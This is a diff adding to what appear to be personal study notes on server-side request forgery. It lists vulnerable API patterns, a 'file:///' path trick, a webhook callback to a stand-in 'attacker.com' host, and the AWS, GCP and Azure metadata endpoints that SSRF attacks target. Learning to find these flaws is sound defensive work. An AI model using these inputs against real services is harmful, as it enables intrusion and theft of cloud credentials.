@@ -101,3 +101,35 @@ get /download.php?pdf_path=file:///any_Particuler_folder
 host : books.com
 
 the "file:///" protocol is used to access the files present in a machine in this case we are giving the server a path for pdf but trick is its not pdf path
+
+_________________________________________________________________________________________________________
+API requests that accept user-supplied URLs:
+
+Suppose in a request or web app is asking to give api a user supplied url to fetch images, web pages or webhooks can be vulnerable
+
+File Download APIs
+GET /fetch?url=<user-supplied-URL>
+GET /proxy?source=<user-supplied-URL>
+
+Webhooks & Callbacks
+POST /webhook { "callback_url": "http://attacker.com" }
+
+Open Redirect APIs
+GET /redirect?to=<user-supplied-URL>
+
+Image Processing APIs
+POST /image/convert { "image_url": "http://example.com/pic.jpg" }
+
+PDF Generators & Screenshot APIs
+POST /generate_pdf { "url": "http://example.com/page" }
+
+OAuth & SSO Redirections
+GET /oauth?redirect_uri=<user-controlled-URL>
+
+Metadata Services in Cloud Environments
+AWS: http://169.254.169.254/latest/meta-data/
+GCP: http://metadata.google.internal/computeMetadata/v1/
+Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
+
+_________________________________________________________________________________________________________
+
